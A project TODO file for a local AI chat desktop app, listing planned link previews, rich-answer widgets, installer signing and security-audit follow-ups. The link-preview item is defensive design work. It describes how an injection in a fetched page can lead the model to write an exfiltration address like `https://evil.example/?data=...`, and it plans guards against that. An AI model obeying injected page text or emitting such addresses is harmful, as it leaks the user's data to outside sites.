# TODO

Things we decided to do later, so that nobody has to remember them. Each item says why it is not done yet and what it needs.
When one is done, move it to "Done" at the bottom with the PR number.

## Chat

### Link previews with an image for the sources of a web answer

Noted 2026-10-31. ChatGPT shows the image of a source (the `og:image` of the page) in its cards. We have the follow-up cards and the
source pills (PR 335), without images.

Why later: it is decoration, and it works against the promise of a private, local app. Every image tells the site, without a click,
that this IP address is reading its page, and pages can carry tracking pixels. Nothing in the chain gives an image today: a search
hit holds a title, an address, a description and a source, and `web_fetch` extracts no image.

What it would need, and why each point matters:
- **Opt in, off by default.** A setting such as "Show link previews". Without it the app calls no third-party site.
- **An address the search returned, never one the model wrote.** The model writes the pills, and a page it read can carry an
  injection that makes it write `https://evil.example/?data=...`. The backend must keep the addresses of the real search results of
  the session and refuse any other, or the preview endpoint becomes a way to send data out.
- **A preview endpoint in the Go backend** (`og:image`, title and site name of an address) with an SSRF guard: HTTPS only, no
  loopback, private or link-local address, checked after the DNS resolution and again on every redirect, a short timeout, a size cap,
  an image content type only, a cache in memory.
- **The image itself.** The content security policy only allows `'self'`, `data:`, `file:`, `blob:` and the DuckDuckGo favicons, on
  purpose: it blocks exfiltration. Two ways, to decide then: the backend fetches the image and hands it over without storing it (the
  policy does not change, the site sees the same IP address), or the renderer loads it directly with a gate in the main process
  (`session.webRequest.onBeforeRequest`) that lets through only the image addresses the preview endpoint returned. Loading
  directly was the first wish, to keep their images out of the app; the gate is what keeps a model-written image address out.
- **No referrer, no cookies**, and load on hover or on a click rather than on display, if the privacy cost is a concern.

Size: about two PRs (the endpoint with its guards and tests, then the card and the gate).

### Rich answers: what is left

See [0005](decisions/0005-chat-ui-catalog.md), [0007](decisions/0007-chat-charts-and-plots.md), [0008](decisions/0008-chat-interactions.md)
and [0023](decisions/0023-all-families-and-the-hub.md). Forms, inputs, quizzes, sliders and live formulas, diagrams, the architecture poster and
the families of the prompt are done (see Done).

- **Open a file at a line or a page.** `FileRef` opens a text file in the Files panel; the line and the page it can carry are not
  used yet, and the panel has no way to scroll to a line.
- **Interactive widgets beyond sliders, artifacts and projects.** 3D scenes, HTML prototypes and real sites run and tested by the agent in the
  browser: an Artifacts panel and projects, how to make them reliable, the order to do them in, and the sources are in
  [0010](decisions/0010-interactive-widgets-and-artifacts.md). The pages the agent writes already open live beside the conversation; the rest is
  to discuss, not scheduled.
- **Patch a drawing in place.** Change one box of an architecture drawing without drawing it again (it comes with the Artifacts panel of 0010).
- **More kinds of curves.** Parametric and polar curves, implicit curves (a circle), inequalities, 3D surfaces, a neural network
  drawn as layers.
- **An answer that updates in place.**
- **Fonts in the downloaded SVG.** The SVG is faithful on screen but the fonts are not embedded.

## Release and security

From the audit of 2026-11-07. What was done (a gosec triage of the high findings, a Windows test job, commits pinned in the catalog, rules on
`main`, `dev` and the `v*` tags, secret scanning and a security policy) is in the changelog; this is what is left.

### Sign the installers

Noted 2026-11-07. The Windows installer of every release is built unsigned (the build warns "no WIN_CSC_LINK secret") and the macOS app is
signed ad hoc (`identity: "-"`) and not notarized. Windows SmartScreen and macOS Gatekeeper warn the person, and the update feed rests on
GitHub and a hash only.

Why later: it needs things that are not here yet. No certificate has been bought, and the person who decides cannot get one for now.

What it needs:
- **Windows.** A code signing certificate (an OV certificate, or an EV one to avoid the SmartScreen warning from the first download). The
  release workflow already signs when the repository secrets `WIN_CSC_LINK` (the .pfx as base64 or a URL) and `WIN_CSC_KEY_PASSWORD` exist.
- **macOS.** An Apple Developer account, a Developer ID Application certificate and a notarization key. The workflow does not do it yet:
  `identity` must stop being `"-"` and the notarization step must be added, which can only be tried with a manual run of the release
  workflow (a tag is the only other way, so try it on a tag that is not published first).

### Read the pinned catalog commits again

Noted 2026-11-07 (ADR 0026). The commits written in `skills_catalog.go` are those of the day they were pinned, not the ones the entries were
read at. Reading each repository again at its commit (the instructions of its skills and every script they run) is what makes the pin mean
"reviewed". Moving a `Ref` later should come with the difference between the two commits read.

### Bring the release workflow up to date

Noted 2026-11-07. `release-desktop.yml` still uses `actions/checkout@v4` and `actions/setup-go@v5`, which the runner reports as Node 20 (the CI
workflow was moved to v7), and a script that `actionlint` flags (`sha256sum *`, SC2035). The workflow only runs on a tag, so change it
together and try it with a manual run (it builds the installers and keeps them as artifacts) before the next tag.

### Triage the other findings of gosec

Noted 2026-11-07. The high findings were read one by one and a new one now fails the CI. The 73 of medium severity and the 7 of low
severity are only reported (file permissions of 0644 or 0755 where 0600 or 0750 would do, files opened from a variable, commands
started with arguments). Most are expected in an app that writes the files of the person; a pass over them would raise a few and justify
the rest, then let the medium ones fail the job too. Run gosec on macOS as well: it was not analysed (the CI runs on Linux only).

### Tests that only run on one system

Noted 2026-11-07. The tests run on Linux and, since 2026-11-07, on Windows. Nothing runs on macOS, which the README calls experimental.
About twenty-five packages have no test at all, most of them under `internal/cloud/`, `internal/oauth/`, `internal/audit` and
`internal/metrics`.

## Done

- 2026-11-02: the Changes card of the right panel lists the pull requests the agent opened, with their checks, and can merge them (0.3.3).
- 2026-11-01 to 2026-11-07: forms, quizzes and flashcards, sliders and live formulas, the diagrams, the architecture poster, tables to fill in,
  drafts for a mail app, the hub diagram, and every family taught by default (ADRs 0013 to 0024).
- 2026-11-07: rules on `main`, `dev` and the `v*` tags, secret scanning with push protection, private vulnerability reporting, Dependabot
  security updates, CodeQL; gosec fails the CI on a new high finding; the tests run on Windows; the repositories of the catalog are
  pinned to a commit (#513, #514, #515).
- 2026-10-31: follow-up cards (a `Choice` with a description and an icon) and `SourcePills` in rich answers (PR 335).
- 2026-10-29: the prompt reads the last answers of the session to keep a family a follow-up needs; `FileRef` opens a text file in the
  Files panel.
